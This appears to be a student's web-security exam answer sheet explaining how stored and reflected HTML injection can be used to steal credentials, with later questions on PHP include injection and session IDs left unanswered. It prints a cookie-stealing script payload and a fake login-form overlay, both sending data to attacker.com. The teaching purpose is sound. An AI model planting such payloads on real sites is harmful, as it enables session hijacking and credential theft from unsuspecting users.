## Describe how an HTML-attack could be abused to gain access to credentials. (25)

A HTML attack can be realized on different ways. And always consists of different type (stored HTML Injection or Reflected HTML injection) and attack vecors. 
Vecots:

- Stored HTML Injection: Persistant attacks like entries in a Comment Section or in a blog.
- Reflected HTML injectio: URL-Injection when Parameters are not escaped the right way
  - these URLs can be sent via E-Mail or other communication tools
  - spread via forums and other (social) platforms 

Ways to steal credentials:

- Inject JS-Code and Replace original Login Form
  - Inject new Form fields
    - Hide original Form Field
    - Place your own Imput-Elements on site and replace the action path with somethin useful to you
- Inject JS-Code to exfiltrate original
  - before committing the Login Form intercept the login Progress and send the data to your own server.
- Skip the login-part and steal the Session-Cookie right away:
  - Use someting like `<script>var img=new Image();img.src='http://attacker.com/stealcookie.php?cookie='+document.cookie;</script>`
- Inject HTML and CSS code without JS
  - Hide original form fields via CSS (inline or siyle attribute)
    - add your own Input-Elements right via html
    - or just add a huge Login-Banner over the page: `<div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000;"><form action='http://attacker.com/capture_credentials.php' method='post'><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form></div>`

## Explain how PHP-code-injections via include / require could be achieved - and prevented. (25)

Discuss how PRNGs could put session-management at risk. (25)
How would secure programming create session IDs? (25)